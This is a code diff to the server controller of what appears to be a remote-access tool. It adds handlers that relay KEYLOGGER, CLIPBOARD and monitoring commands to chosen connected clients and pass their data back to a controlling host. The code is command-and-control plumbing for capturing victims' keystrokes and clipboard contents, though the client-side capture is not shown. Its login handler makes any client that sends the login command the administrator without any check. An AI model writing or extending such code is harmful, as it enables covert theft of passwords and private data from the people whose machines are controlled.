@@ -9,8 +9,10 @@ import utils.console;
 
 import java.util.HashMap;
 import java.util.Map;
+import java.util.zip.Adler32;
 
 import static utils.Command.*;
+import static utils.Command.COMMAND_MONITORING;
 import static utils.Environment.*;
 
 public class Controller {
@@ -19,24 +21,60 @@ public class Controller {
     public static void init() {
         put(COMMAND_LOGIN, Controller::getLogin);
         put(COMMAND_BROADCAST, Controller::getBroadcast);
+        put(COMMAND_MONITORING, Controller::getMonitoring);
         put(COMMAND_GET_ALL_CLIENTS, Controller::getAllClients);
         put(COMMAND_CLIENT_SYSTEM_INFO, Controller::getClientSystemInfo);
+        put(COMMAND_CLIPBOARD, Controller::getClipboard);
+        put(COMMAND_KEYLOGGER, Controller::getKeylogger);
+    }
+
+    private static void getKeylogger(JSON json, SocketModel model) {
+        if (json.get("uuid").equals(Server.getHost().getUUID())) {
+            Server.getClientConnections().get(json.get("to")).onSend(new MessageModel(DEFAULT_SERVER_HOST, json.get("to"), COMMAND_KEYLOGGER).json());
+            return;
+        }
+
+        Server.getHost().onSend(json.toString());
+    }
+
+    private static void getClipboard(JSON json, SocketModel model) {
+        if (json.get("uuid").equals(Server.getHost().getUUID())) {
+            Server.getClientConnections().get(json.get("to")).onSend(new MessageModel(DEFAULT_SERVER_HOST, json.get("to"), COMMAND_CLIPBOARD).json());
+            return;
+        }
+
+        Server.getHost().onSend(json.toString());
+    }
+
+    private static void getMonitoring(JSON json, SocketModel model) {
+        if (json.get("uuid").equals(Server.getHost().getUUID())) {
+            String temp = new MessageModel(DEFAULT_SERVER_HOST, json.get("to"), COMMAND_MONITORING).json();
+            Server.getClientConnections().get(json.get("to")).onSend(temp);
+            return;
+        }
+
+        Server.getHost().onSend(new MessageModel(DEFAULT_SERVER_HOST, DEFAULT_SERVER_HOST, COMMAND_MONITORING)
+                .put("ram", json.get("ram"))
+                .put("cpu", json.get("cpu"))
+                .put("disk", json.get("disk"))
+                .json());
     }
 
     private static void getClientSystemInfo(JSON json, SocketModel model) {
         String uuid = model.getUUID();
-        ClientSocketModel temp = Server.getClientConnections().get(uuid);
-        temp.setCpu(json.get("cpu"));
-        temp.setRam(json.get("ram"));
-        temp.setDisk(json.get("disk"));
-        console.warn("Client[" + uuid + "] updated system info!");
+        ClientSocketModel client = Server.getClientConnections().get(uuid);
+        JSON result = new JSON(json.get("result"));
+        client.setIp(result.get("ip"));
+        client.setRam(result.get("ram"));
+        client.setCpu(result.get("cpu"));
+        client.setDisk(result.get("disk"));
+        console.log("Client[" + uuid + "] updated system info!");
     }
 
     private static void getLogin(JSON json, SocketModel model) {
         String uuid = model.getUUID();
         Server.setHost(uuid);
         console.warn("Client[" + uuid + "] is now a Administrator");
-        model.onSend(new MessageModel(DEFAULT_SERVER_HOST, uuid, COMMAND_RESPONSE).put(MESSAGE, RESPONSE_SUCCESS).json());
     }
 
     private static void getAllClients(JSON json, SocketModel model) {
